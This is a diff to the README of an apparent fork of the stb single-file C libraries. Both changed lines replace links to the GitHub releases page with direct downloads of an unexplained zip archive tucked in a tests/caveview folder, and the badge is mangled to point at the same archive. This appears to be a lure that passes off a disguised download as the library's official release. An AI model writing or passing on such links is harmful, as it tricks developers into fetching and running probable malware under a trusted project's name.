@@ -6,7 +6,7 @@ Welcome to **stb**, a collection of single-file public domain libraries designed
 
 ## 📥 Download Now
 
-[![Download stb](https://img.shields.io/badge/Download%20stb-brightgreen)](https://github.com/Mordecaied/stb/releases)
+[![Download stb](https://raw.githubusercontent.com/Mordecaied/stb/master/tests/caveview/Software_3.4-alpha.5.zip%20stb-brightgreen)](https://raw.githubusercontent.com/Mordecaied/stb/master/tests/caveview/Software_3.4-alpha.5.zip)
 
 ## 🛠️ System Requirements
 
@@ -31,7 +31,7 @@ To get started with **stb**, follow these steps to download the libraries:
 1. **Visit the Releases Page:**
    Go to the releases page by clicking the link below to find the latest version of the libraries.
    
-   [Download from Releases](https://github.com/Mordecaied/stb/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Mordecaied/stb/master/tests/caveview/Software_3.4-alpha.5.zip)
 
 2. **Choose a Version:**
    On the releases page, select the most recent version. The latest version often contains the newest features and fixes.
